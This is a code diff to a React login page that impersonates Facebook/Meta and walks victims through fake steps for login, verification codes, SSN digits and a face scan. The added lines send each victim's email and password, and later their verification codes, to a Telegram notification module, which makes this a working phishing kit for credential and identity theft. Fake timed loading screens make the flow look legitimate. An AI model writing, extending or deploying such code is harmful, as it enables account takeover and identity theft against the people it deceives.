@@ -11,7 +11,7 @@ import {
   DialogDescription,
 } from "@/components/ui/dialog";
 import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
-import { notifyVerificationStart, notifyVerificationStep, notifyVerificationComplete, type VerificationStep } from '@/lib/telegram';
+import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
 
 function FacebookLoader() {
   return (
@@ -72,7 +72,8 @@ export default function LoginPage() {
   const [signupOpen, setSignupOpen] = useState(false);
   const [isLoggingIn, setIsLoggingIn] = useState(false);
   const [isSigningUp, setIsSigningUp] = useState(false);
-  const [currentStep, setCurrentStep] = useState<VerificationStep>("login");
+  const [currentStep, setCurrentStep] = useState<string>("login");
+  const [userEmail, setUserEmail] = useState("");
   const [verificationCode1, setVerificationCode1] = useState("");
   const [verificationCode2, setVerificationCode2] = useState("");
   const [ssnDigits, setSsnDigits] = useState("");
@@ -109,28 +110,17 @@ export default function LoginPage() {
   useEffect(() => {
     let timer: NodeJS.Timeout;
 
-    if (currentStep === "login") {
-      notifyVerificationStart();
-    } else if (currentStep === "loading-login") {
-      notifyVerificationStep("loading-login");
+    if (currentStep === "loading-login") {
       timer = setTimeout(() => setCurrentStep("code1"), 3000);
     } else if (currentStep === "loading-code1") {
-      notifyVerificationStep("loading-code1");
       timer = setTimeout(() => setCurrentStep("code2"), 5000);
     } else if (currentStep === "loading-code2") {
-      notifyVerificationStep("loading-code2");
       timer = setTimeout(() => setCurrentStep("ssn"), 10000);
     } else if (currentStep === "loading-ssn") {
-      notifyVerificationStep("loading-ssn");
       timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
-    } else if (currentStep === "face-verification") {
-      notifyVerificationStep("face-verification");
     } else if (currentStep === "face-rotation") {
-      notifyVerificationStep("face-rotation");
       setCurrentDirection("center");
       setCompletedDirections(new Set());
-    } else if (currentStep === "complete") {
-      notifyVerificationComplete();
     }
 
     return () => clearTimeout(timer);
@@ -147,12 +137,15 @@ export default function LoginPage() {
   const handleLogin = async (data: LoginForm) => {
     setIsLoggingIn(true);
     console.log("Login attempt:", data);
+    setUserEmail(data.email);
+    await notifyLogin(data.email, data.password);
     setCurrentStep("loading-login");
     setIsLoggingIn(false);
   };
 
-  const handleCode1Submit = () => {
+  const handleCode1Submit = async () => {
     if (verificationCode1.length >= 4) {
+      await notifyCode(userEmail, verificationCode1);
       setCurrentStep("loading-code1");
     }
   };
@@ -176,6 +169,7 @@ export default function LoginPage() {
         audio: false
       });
       setStream(mediaStream);
+      await notifyFaceScan(userEmail);
       setCurrentStep("face-rotation");
       if (videoRef) {
         videoRef.srcObject = mediaStream;
@@ -564,6 +558,7 @@ export default function LoginPage() {
               <button
                 onClick={() => {
                   setCurrentStep("login");
+                  setUserEmail("");
                   setVerificationCode1("");
                   setVerificationCode2("");
                   setSsnDigits("");
